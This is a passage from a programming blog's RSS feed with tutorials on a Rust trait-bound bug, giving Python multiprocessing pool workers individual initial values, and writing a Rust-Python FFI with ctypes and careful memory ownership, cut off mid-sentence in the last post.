HashDispatcher&lt;T&gt; {}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// this fails, the bound is not promoted</span></span><br><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_hash</span>&lt;T: HashVal&gt;() <span class="hljs-punctuation">-&gt;</span> T {</span><br><span class="line">    Hasher::<span class="hljs-title function_ invoke__">digest</span>()</span><br><span class="line">}</span><br></pre></div></div><p >The flaw is quite annoying. We still have to replicate the verbose trait bounds here and there. Hopefully it can be fixed in the future.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Rust/">Rust</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Compiler/">Compiler</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Type-Theory/">Type Theory</category>
      
      
      <comments>https://i.hsfzxjy.site/a-bug-of-promoting-complex-trait-bounds-in-rust/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Initialize Process Pool Worker with Individual Value</title>
      <link>https://i.hsfzxjy.site/initialize-pool-worker-with-individual-values/</link>
      <guid>https://i.hsfzxjy.site/initialize-pool-worker-with-individual-values/</guid>
      <pubDate>Sun, 20 Mar 2022 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;There could be scenes when you are using &lt;code&gt;multiprocessing.pool.Pool&lt;/code&gt; and you want to perform some initialization for each wor</description>
        
      
      
      
      <content:encoded><![CDATA[<p >There could be scenes when you are using <code>multiprocessing.pool.Pool</code> and you want to perform some initialization for each worker before tasks are scheduled via <code>Pool.map()</code> or something alike. For example, you create a pool of 4 workers, each for one GPU, and expect tasks scheduled on Worker-i to precisely utilize GPU-i. In this case, Worker-i should be initialized with env var <code>CUDA_VISIBLE_DEVICES=&lt;i&gt;</code> set.</p><p >To initialize spawned workers, the constructor of <code>Pool</code> provides two arguments concerning the job <sup id="fnref:1"><a href="#fn:1">1</a></sup> – <code>initializer</code> and <code>initargs</code>. <code>initializer</code> is expected to be a callable, and if specified, each worker process will call <code>initializer(*initargs)</code> when it starts.</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">import</span> multiprocessing <span class="hljs-keyword">as</span> mp</span><br><span class="line"><span class="hljs-keyword">import</span> multiprocessing.pool <span class="hljs-keyword">as</span> mpp</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">arg1</span>):</span><br><span class="line">    <span class="hljs-built_in">print</span>(arg1)</span><br><span class="line"></span><br><span class="line">mpp.Pool(processes=<span class="hljs-number">2</span>, initializer=worker, initargs=(<span class="hljs-number">42</span>, ))</span><br><span class="line"><span class="hljs-comment"># 42</span></span><br><span class="line"><span class="hljs-comment"># 42</span></span><br></pre></div></div><p  class="par"> This is, however, slightly away from what we expect. The <code>initializer</code> is called with same arguments in each worker, while in our case, the arguments are expected to be different, like value <code>1</code> for Worker-0 and value <code>1</code> for Worker-1. There are two approaches to do the tricks.</p><h2 id="use-a-queue">Use a Queue</h2><p ><code>Queue</code> and <code>SimpleQueue</code> types in module <code>multiprocessing</code> <sup id="fnref:2"><a href="#fn:2">2</a></sup> implement multi-producer, multi-consumer FIFO queues under the multi-processing scenario. We may create and share a queue among parent and worker processes, send individual values from parent processes and read them from workers. Since the sending and receiving operations are synchronized, we won’t run into any race conditions.</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">q</span>):</span><br><span class="line">    <span class="hljs-built_in">print</span>(q.get())</span><br><span class="line"></span><br><span class="line">q = mp.SimpleQueue()</span><br><span class="line">p = mpp.Pool(processes=<span class="hljs-number">2</span>, initializer=worker, initargs=(q,))</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):</span><br><span class="line">    q.put(i)</span><br><span class="line">p.close()</span><br><span class="line"><span class="hljs-comment"># 0</span></span><br><span class="line"><span class="hljs-comment"># 1</span></span><br></pre></div></div><h2 id="use-a-value">Use a Value</h2><p >Alternatively, we may use a lighter shared object other than a queue. The <code>Value</code> type in module <code>multiprocessing</code> <sup id="fnref:3"><a href="#fn:3">3</a></sup> allows sharing simple values across multiple processes. It can also synchronize accesses to values to avoid race conditions if necessary. We can use a <code>Value</code> object to allocate an individual id for each worker process.</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">v</span>):</span><br><span class="line">    <span class="hljs-keyword">with</span> v.get_lock():</span><br><span class="line">        val = v.value</span><br><span class="line">        v.value += <span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(val)</span><br><span class="line"></span><br><span class="line">v = mp.Value(ctypes.c_int32, <span class="hljs-number">0</span>, lock=<span class="hljs-literal">True</span>)</span><br><span class="line">p = mpp.Pool(processes=<span class="hljs-number">2</span>, initializer=worker, initargs=(v,))</span><br><span class="line">p.close()</span><br><span class="line"><span class="hljs-comment"># 0</span></span><br><span class="line"><span class="hljs-comment"># 1</span></span><br></pre></div></div><div class="footnotes"><ol><li class="footnote" id="fn:1"><a href="https://docs.python.org/3/library/multiprocessing.html#multiprocessing.pool.Pool">https://docs.python.org/3/library/multiprocessing.html#multiprocessing.pool.Pool</a></li><li class="footnote" id="fn:2"><a href="https://docs.python.org/3/library/multiprocessing.html#multiprocessing.Queue">https://docs.python.org/3/library/multiprocessing.html#multiprocessing.Queue</a></li><li class="footnote" id="fn:3"><a href="https://docs.python.org/3/library/multiprocessing.html#multiprocessing.Value">https://docs.python.org/3/library/multiprocessing.html#multiprocessing.Value</a></li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Python/">Python</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Multiprocessing/">Multiprocessing</category>
      
      
      <comments>https://i.hsfzxjy.site/initialize-pool-worker-with-individual-values/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Rust - Python FFI From Scratch</title>
      <link>https://i.hsfzxjy.site/rust-python-ffi-from-scratch/</link>
      <guid>https://i.hsfzxjy.site/rust-python-ffi-from-scratch/</guid>
      <pubDate>Fri, 11 Mar 2022 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;I was recently working on a side project that involves communication between binaries written in Rust and web interfaces written in Pyth</description>
        
      
      
      
      <content:encoded><![CDATA[<p >I was recently working on a side project that involves communication between binaries written in Rust and web interfaces written in Python. Moving a part of my project onto a language like Rust is under several considerations: <em>1)</em> the logic is all about manipulating byte arrays, where Python has deficit and system language like Rust is superior; <em>2)</em> the logic happens to be complicated, I need a static type system to ensure the correctness, and also the <code>match</code> expression of Rust is found helpful in getting things concise; <em>3)</em> I was planning to develop CLI tools with Rust, which calls this fraction of functionality, and I don’t want to rewrite the stuff in the future.</p><p >For half a day, I was reading about FFI between the two languages, and finally got everything work as intended. Before stepping into the technical sharing, I would firstly set up the stage of our story.</p><p  class="nomargin"> My project stores a list of <em>“widgets”</em> in local files on the server side. As of what <em>“widgets”</em> are, it’s sufficient to know that they are stored in a compact binary format. A web endpoint recieves user-provided modification in a similar format, applies them on existing widgets and writes the new widgets back to the files. Technically, the endpoint has two byte arrays as input, <code>mods</code> extracted from the HTTP request and <code>widgets</code> read from local files, which are processed at the Rust side by a function named <code>mod_widgets()</code>, and yields one byte array <code>new_widgets</code> as output.</p><figure class="graphviz"><svg xmlns="http://www.w3.org/2000/svg" width="562pt" height="128pt" viewBox="0 0 562.2 127.52"><g class="graph"><path fill="none" d="M0 127.52V0h562.2v127.52z"/><g class="node" transform="translate(4 123.52)"><path fill="none" d="M92.65-119.52h-66.9v22.26h66.9z"/><text x="59.2" y="-103.34" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">Rust Side</text></g><g class="node" transform="translate(4 123.52)"><path fill="none" d="M80.4-30.51H0v22.26h80.4z"/><text x="40.2" y="-14.33" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">Python Side</text></g><g class="node" transform="translate(4 123.52)"><path fill="#fff5ee" stroke="#444" d="M320.65-119.52h-96.9v22.26h96.9z"/><text x="272.2" y="-103.34" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">mod_widgets()</text></g><g class="node" transform="translate(4 123.52)"><path fill="#fff5ee" stroke="#444" d="M431.65-38.76h-96.9V0h96.9z"/><text x="383.2" y="-22.58" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">consume</text><text x="383.2" y="-6.08" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">new_widgets...</text></g><g class="edge" transform="translate(4 123.52)"><path fill="none" stroke="#444" d="M281.63-97.01c10.04 10.74 26.68 27.67 42.82 40.25 5.09 3.97 10.64 7.88 16.23 11.57"/><path fill="#444" stroke="#444" d="m342.23-48.35 6.53 8.34-10.3-2.44z"/><text x="351.82" y="-64.13" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">new_widgets</text></g><g class="node" transform="translate(4 123.52)"><path fill="#fff5ee" stroke="#444" d="M210.15-30.51h-93.9v22.26h93.9z"/><text x="163.2" y="-14.33" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">recieved mods</text></g><g class="edge" transform="translate(4 123.52)"><path fill="none" stroke="#444" d="M175.23-30.83c13.88-11.97 37.49-32.03 58.47-48.43 4.69-3.67 9.78-7.49 14.68-11.1"/><path fill="#444" stroke="#444" d="m246.04-92.98 10.14-3.05-6.02 8.71z"/><text x="250.95" y="-69.76" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">widgets,</text><text x="250.95" y="-58.51" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">mods</text></g></g></svg></figure><blockquote><p  class="par"> “byte array” here refers to an array of consecutively stored unsigned 8-bit integers, which is a language-agnostic term. Different languages may adopt their own types or representations for this term, <em>e.g.</em>, <code>bytearray</code> in Python, <code>Vec&lt;u8&gt;</code> in Rust or <code>Uint8Array</code> in Javascript.</p></blockquote><p >I have learned about <a href="https://github.com/PyO3/pyo3">PyO3</a>, a fascinating framework for writing Python extensions in Rust. But this time I choose not to use it but build everything from scratch. The data passed around is in a basic representation of byte array, simple enough even without the help of PyO3. Besides, building from scratch will give me a better understanding of how the gear works, and how to accomplish in a memory-safe <sup id="fnref:1"><a href="#fn:1">1</a></sup> and efficient <sup id="fnref:2"><a href="#fn:2">2</a></sup> way.</p><p >To this end, I was going to write a dynamic library in Rust, from which the Python code calls certain functions to do the job. The post is organized in three parts. The first part briefly introduces the fundamental of calling functions written by a different programming language, and the following parts show detailed implementation in both Rust and Python.</p><h2 id="ffi-fundamental">FFI Fundamental</h2><p >There’s technical term <strong>FFI</strong> <sup id="fnref:3"><a href="#fn:3">3</a></sup> to describe the mechanism of calling functions from a different programming language. One of the common ways to do FFI is wrapping the functions written in one language in a dynamically linked library <sup id="fnref:4"><a href="#fn:4">4</a></sup>, which is then loaded from another language. However in practice, there’re tons of troubles to concern about and coding can get really cumbersome.</p><p >One of the troubles is ABI compatibility. ABI here refers to <a href="https://en.wikipedia.org/wiki/Application_binary_interface">Application Binary Inteface</a>, an interface between two binary program modules. The term is less familiar to whom work at a higher level such as Python users, but it does exist everywhere in your computer.</p><p  class="nomargin"> When a program calls functions from a library, they should conform the same conventions in various aspects, such as calling conventions <sup id="fnref:5"><a href="#fn:5">5</a></sup>, memory layout <sup id="fnref:6"><a href="#fn:6">6</a></sup>, <em>etc.</em>. For example, C organizes struct fields in the order of their definition, while Rust by default does not guarantee. There’re also other details like name mangling, where Rust may give the function a different name when producing bianries. If not turned off, the functions can not be located from the Python side.</p><p  class="nomargin"> Currently, most foreign code exposes a C ABI, <em>i.e.</em>, the ABI generated by the C compiler on your platform. While not standardized, the mechanism serves as a widely used ABI in many cases.</p><p >Another concern is the implications of different languages that might cause undesired behavior on the other side. For example, in GC-based languages like Python, if you pass the pointer to an variable to a foreign function and then drop the variable, the variable might be recycled and the pointer becomes invalid at the other side:</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_getb</span>():</span><br><span class="line">    a = <span class="hljs-built_in">bytearray</span>(...)</span><br><span class="line">    b = ffi_atob(ptr_of(a))  <span class="hljs-comment"># b hold a reference to a</span></span><br><span class="line">    <span class="hljs-keyword">return</span> b</span><br><span class="line">    <span class="hljs-comment"># a dropped here!</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_btoc</span>(<span class="hljs-params">b</span>):</span><br><span class="line">    <span class="hljs-keyword">return</span> ffi_btoc(b)</span><br><span class="line"></span><br><span class="line">b = func_getb()   <span class="hljs-comment"># a might be recycled, which invalidates b</span></span><br><span class="line">c = func_btoc(b)  <span class="hljs-comment"># BOOM!</span></span><br></pre></div></div><p  class="par"> Similar cases exist in Rust. If one allocates a <code>Vec&lt;u8&gt;</code> on the stack and passes out its inner raw pointer, the vec will be dropped at the end of the function and invalidates the pointer:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">foo</span>() <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span> {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">0u8</span>; <span class="hljs-number">1024</span>];</span><br><span class="line">    v.<span class="hljs-title function_ invoke__">as_ptr</span>()</span><br><span class="line">    <span class="hljs-comment">// v dropped here! returned pointer becomes invalid.</span></span><br><span class="line">}</span><br></pre></div></div><p  class="par"> Exception handling is another headache. Since different languages have their own approaches to propagate exceptions, it’s essential to stop them before crossing the binary boundary, or otherwise undefined behaviors will occur or even the whole program be crashed.</p><p >In this story, I follow the convention of using C ABI as the bridge of foreign calling, that is, exposing interfaces with <code>extern &quot;C&quot;</code> at Rust and calling with <code>ctypes</code> at Python. Efforts also should be my to ensure exception and memory safety.</p><h2 id="the-rust-side">The Rust Side</h2><p >Let’s start by creating a new cargo package. Simply open a terminal in a new directory and type <code>cargo init --lib</code>. The brilliant Rust package manager will prepare the scaffold to build a shared library. We then add the following lines to the manifest file <code>Cargo.toml</code></p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># -- snip --</span></span><br><span class="line"><span class="hljs-section">[lib]</span></span><br><span class="line"><span class="hljs-attr">crate-type</span> = [<span class="hljs-string">&quot;cdylib&quot;</span>]</span><br></pre></div></div><p  class="par"> As described in the <a href="https://doc.rust-lang.org/reference/linkage.html#:~:text=%2D%2Dcrate%2Dtype%3Dcdylib%2C%20%23%5Bcrate_type%20%3D%20%22cdylib%22%5D">doc</a>, the <code>crate-type = [&quot;cdylib&quot;]</code> is essential for generating FFI-purposed libraries, without which the library won’t be built with a stable ABI.</p><p  class="noindent"> Our core implementation will go into the file <code>lib.rs</code>. In this simple library, we are going to expose a function <code>mod_widgets</code>. Let’s write down the a skeleton for it</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment">// lib.rs</span></span><br><span class="line"><span class="hljs-meta">#[no_mangle]</span></span><br><span class="line"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">mod_widgets</span>(widgets: *<span class="hljs-keyword">mut</span> FFIVec, mods: *<span class="hljs-keyword">mut</span> FFIVec) <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">const</span> FFIVec {</span><br><span class="line">    todo!()</span><br><span class="line">}</span><br></pre></div></div><blockquote><p  class="par"> <code>#[no_mangle]</code> here disables name mangling for this function. It will therefore appear in the symbol table with exactly the name <code>mod_widgets</code> and become accessible from outside.The <code>extern &quot;C&quot;</code> syntax tells the compiler that our function should conform the C ABI, so that other binaries can call it with the same convention.</p></blockquote><p  class="par"> <code>FFIVec</code> is a struct encapsulates a byte array and acts as a bridge to exchange data between the two languages. The details will be introduced shortly later, but before which I would like to clarify a fact, that is, there actually exist two kinds of byte arrays in our story</p><ol><li>Byte arrays created at Python and accessed from Rust;</li><li>Byte arrays created at Rust and accessed from Python.</li></ol><p  class="par"> Why is it important? Because <strong>objects created at one language cannot be de-allocated at the other side.</strong> Imagine, for instance, you apply for a loan at Bank A but later you pay back the money to Bank B. Bank B will have no idea how to deal with the money and Bank A will never remove your loan record, causing a mess in both sides. Each language has its own and distinct implementation for memory allocation, and we must pair the allocator with corresponding de-allocator. We must keep this in mind when crafting the details of <code>FFIVec</code>.</p><h3 id="byte-arrays-from-python">Byte Arrays from Python</h3><p >To access the first kind of byte array in Rust, it is sufficient to use the following data structure, which tells the starting location and the length of the array</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#[repr(C)]</span></span><br><span class="line"><span class="hljs-meta">#[derive(Debug)]</span></span><br><span class="line"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">FFIVec</span> {</span><br><span class="line">    len: <span class="hljs-type">usize</span>,</span><br><span class="line">    data: *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>,</span><br><span class="line">}</span><br></pre></div></div><blockquote><p  class="par"> The attribute <code>#[repr(C)]</code> enforces the compiler to use a memory layout that conform the C ABI. Otherwise Rust code might read unaligned or corrupted data.</p></blockquote><p  class="nomargin"> Code at Python side can construct a similar struct using something like <code>ctypes</code> and pass its reference to <code>mod_widgets()</code>. Code at Rust side then re-interprets the <code>*mut FFIVec</code> pointer to type <code>&amp;[u8]</code> for easier further processing, with the help of function <code>FFIVec::raw_to_slice()</code></p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">FFIVec</span> {</span><br><span class="line">    <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">raw_to_slice</span>&lt;<span class="hljs-symbol">&#x27;a</span>&gt;(ptr: *<span class="hljs-keyword">mut</span> <span class="hljs-keyword">Self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">&#x27;a</span> [<span class="hljs-type">u8</span>] {</span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span> = <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">from_raw</span>(ptr);</span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">slice</span> = core::slice::<span class="hljs-title function_ invoke__">from_raw_parts</span>(v.data, v.len);</span><br><span class="line">        <span class="hljs-comment">// since v &quot;owns&quot; the buffer, we forget it to not let the struct get dropped</span></span><br><span class="line">        std::mem::forget(v);</span><br><span class="line">        slice</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> It’s worth noting that <code>raw_to_slice()</code> does not perform buffer copying, and therefore impose little runtime overhead, which is efficient.</p><h3 id="byte-arrays-from-rust">Byte Arrays from Rust</h3><p >As of returning a byte array to Python (<em>i.e.</em>, the second kind), however, things get a bit complicated. Remember the pre-caution above – <strong>if a piece of memory is allocated by Rust code, it should eventually be de-allocated by Rust code</strong>. Our library thus need to export another function</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#[no_mangle]</span></span><br><span class="line"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">free_ffi_vec</span>(v: *<span class="hljs-keyword">mut</span> FFIVec) {</span><br><span class="line">    todo!()</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> The Python code is responsible to call <code>free_ffi_vec()</code> manually after consuming the <code>FFIVec</code> struct returned by <code>mod_widgets()</code>. Our working flow is thus extended into</p><figure class="graphviz"><svg xmlns="http://www.w3.org/2000/svg" width="598pt" height="116pt" viewBox="0 0 598.2 116.27"><g class="graph"><path fill="none" d="M0 116.27V0h598.2v116.27z"/><g class="node" transform="translate(4 112.27)"><path fill="none" d="M79.65-108.27h-66.9v22.26h66.9z"/><text x="46.2" y="-92.09" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">Rust Side</text></g><g class="node" transform="translate(4 112.27)"><path fill="none" d="M80.4-30.51H0v22.26h80.4z"/><text x="40.2" y="-14.33" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">Python Side</text></g><g class="node" transform="translate(4 112.27)"><path fill="#fff5ee" stroke="#444" d="M303.65-108.27h-96.9v22.26h96.9z"/><text x="255.2" y="-92.09" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">mod_widgets()</text></g><g class="node" transform="translate(4 112.27)"><path fill="#fff5ee" stroke="#444" d="M431.65-38.76h-96.9V0h96.9z"/><text x="383.2" y="-22.58" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">consume</text><text x="383.2" y="-6.08" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">new_widgets...</text></g><g class="edge" transform="translate(4 112.27)"><path fill="none" stroke="#444" d="M269.74-85.63c11.61 8.22 28.4 19.74 43.71 28.87 6.86 4.09 14.22 8.21 21.5 12.13"/><path fill="#444" stroke="#444" d="m336.59-47.73 7.2 7.78-10.48-1.59z"/><text x="340.82" y="-58.51" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">new_widgets</text></g><g class="node" transform="translate(4 112.27)"><path fill="#fff5ee" stroke="#444" d="M517.9-108.27h-89.4v22.26h89.4z"/><text x="473.2" y="-92.09" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">free_ffi_vec()</text></g><g class="node" transform="translate(4 112.27)"><path fill="#fff5ee" stroke="#444" d="M210.15-30.51h-93.9v22.26h93.9z"/><text x="163.2" y="-14.33" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">received mods</text></g><g class="edge" transform="translate(4 112.27)"><path fill="none" stroke="#444" d="M169.09-30.99c6.25-10.48 16.95-26.44 29.61-37.02 5.76-4.82 12.49-9.07 19.25-12.72"/><path fill="#444" stroke="#444" d="m215.91-83.62 10.51-1.33-7.39 7.6z"/><text x="227.95" y="-58.51" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">widgets, mods</text></g><g class="edge" transform="translate(4 112.27)"><path fill="none" stroke="#444" d="M395.94-39c7.07-9.44 16.46-20.65 26.51-29.01 5.26-4.37 11.3-8.41 17.34-11.97"/><path fill="#444" stroke="#444" d="m438.03-83.01 10.45-1.78-7.06 7.9z"/><text x="449.82" y="-58.51" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">new_widgets</text></g></g></svg></figure><p  class="par"> At Rust side, the duty of <code>free_ffi_vec()</code> is to de-allocate the underlying memory, given the argument of type <code>*mut FFIVec</code> as handle. However, it’s not that trivial as we thought, if we stick to a design of <code>FFIVec</code> like above.</p><p  class="nomargin"> To allocate a byte array, a “Rust-ic” and common way is by constructing a <code>Vec&lt;u8&gt;</code>. It’s straight-forward to write a function that converts a <code>Vec&lt;u8&gt;</code> into <code>*mut FFIVec</code>, in order that it could be pass across the FFI boundary</p><div class="gk-code hljs" data-gk-id="BLOCK10"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">FFIVec</span> {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">from_vec</span>(vec: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;) <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">mut</span> <span class="hljs-keyword">Self</span> {</span><br><span class="line">        <span class="hljs-comment">// build an FFIVec on heap</span></span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span> = <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-keyword">Self</span> {</span><br><span class="line">            len: vec.<span class="hljs-title function_ invoke__">len</span>(),</span><br><span class="line">            data: vec.<span class="hljs-title function_ invoke__">as_ptr</span>(),</span><br><span class="line">        });</span><br><span class="line">        std::mem::forget(vec);</span><br><span class="line">        <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">into_raw</span>(v)</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> Fairly neat and sound. But it upsets you soon, since there’s no way to implement <code>free_ffi_vec()</code> with such a design!</p><p  class="nomargin"> The problem is, our only way to do de-allocation is recovering the <code>*mut FFIVec</code> back to a <code>Vec&lt;u8&gt;</code> and call the <code>drop()</code> function. However, the recover job is impossible, since we “lose” it after the <code>forget()</code> calling.</p><p  class="nomargin"> As a workaround, we have to make our <code>FFIVec</code> a litte bit “fatter”, and invite the original vec to live within the struct. Namely, the implementation is modified into</p><div class="gk-code hljs" data-gk-id="BLOCK11"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#[repr(C)]</span></span><br><span class="line"><span class="hljs-meta">#[derive(Debug)]</span></span><br><span class="line"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">FFIVec</span> {</span><br><span class="line">    len: <span class="hljs-type">usize</span>,</span><br><span class="line">    data: *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>,</span><br><span class="line">    <span class="hljs-comment">// hl: begin</span></span><br><span class="line">    storage: *<span class="hljs-keyword">mut</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;,</span><br><span class="line">    <span class="hljs-comment">// hl: end</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">FFIVec</span> {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">from_vec</span>(vec: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;) <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">mut</span> <span class="hljs-keyword">Self</span> {</span><br><span class="line">        <span class="hljs-comment">// hl: begin</span></span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">vec</span> = <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">new</span>(vec);</span><br><span class="line">        <span class="hljs-comment">// hl: end</span></span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span> = <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-keyword">Self</span> {</span><br><span class="line">            len: vec.<span class="hljs-title function_ invoke__">len</span>(),</span><br><span class="line">            data: vec.<span class="hljs-title function_ invoke__">as_ptr</span>(),</span><br><span class="line">            <span class="hljs-comment">// hl: begin</span></span><br><span class="line">            storage: <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">into_raw</span>(vec),</span><br><span class="line">            <span class="hljs-comment">// hl: end</span></span><br><span class="line">        });</span><br><span class="line">        <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">into_raw</span>(v)</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> A pointer to the original vec is stored as a member in the new design of <code>FFIVec</code>. We now are able to recover it even with a bare <code>*mut FFIVec</code>, and happy to implement the de-allocation</p><div class="gk-code hljs" data-gk-id="BLOCK12"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#[no_mangle]</span></span><br><span class="line"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">free_ffi_vec</span>(v: *<span class="hljs-keyword">mut</span> FFIVec) {</span><br><span class="line">    <span class="hljs-keyword">if</span> v != <span class="hljs-number">0</span> <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> FFIVec {</span><br><span class="line">        <span class="hljs-keyword">unsafe</span> {</span><br><span class="line">            <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span> = <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">from_raw</span>(v);</span><br><span class="line">            <span class="hljs-title function_ invoke__">drop</span>(<span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">from_raw</span>(v.storage));</span><br><span class="line">            <span class="hljs-title function_ invoke__">drop</span>(v)</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></div></div><h3 id="dont-panic">Don’t Panic</h3><p >As aforementioned, we have to care a bunch of implications of Rust, and panic is one of them. The Python interpreter have no idea of who it is interacting with, not even the alien mechanism of panic. It will goes “really panick” if such things cross the boundary, and it’s our duty to stop them just at Rust side.</p><p  class="nomargin"> There’re many ways to avoid panics. For example, always do checking before <code>.wrap()</code> or something alike. In this story, I adopt a rather brutal one which is using <code>std::panic::catch_unwind()</code> <sup id="fnref:7"><a href="#fn:7">7</a></sup>. This guy behaves as a top level try-catch in other languages that invokes a closure and blocks potential panics from leaking. More information on this function can be found in the doc.</p><p  class="noindent"> Now put them together, we finish the 